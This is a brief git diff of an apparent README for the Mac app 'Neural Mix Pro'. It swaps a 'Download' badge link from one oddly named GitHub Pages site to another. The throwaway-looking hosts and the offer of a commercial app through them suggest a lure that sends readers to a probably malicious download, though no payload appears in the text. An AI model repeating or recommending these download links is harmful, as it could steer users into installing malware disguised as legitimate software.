@@ -4,13 +4,7 @@
 
 ![Neural Mix Pro Mac](https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/56/dd/9c/56dd9c88-fc33-6840-ff9a-86d53761bcce/AppIcon-0-0-85-220-0-0-4-0-2x-P3.png/1200x630bb.png)
 
-</div>
-
-<div align="center">
-
-[![📥 Download Neural Mix Pro Mac](https://img.shields.io/badge/📥_Download_Neural_Mix_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://top-ssilka-apps.github.io/.github/neuralmix)
-
-</div>
+[![📥 Download Neural Mix Pro Mac](https://img.shields.io/badge/📥_Download_Neural_Mix_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://renatestenderhwwzy.github.io/.github/Neural-Mix-Pro)
 
 ---
 
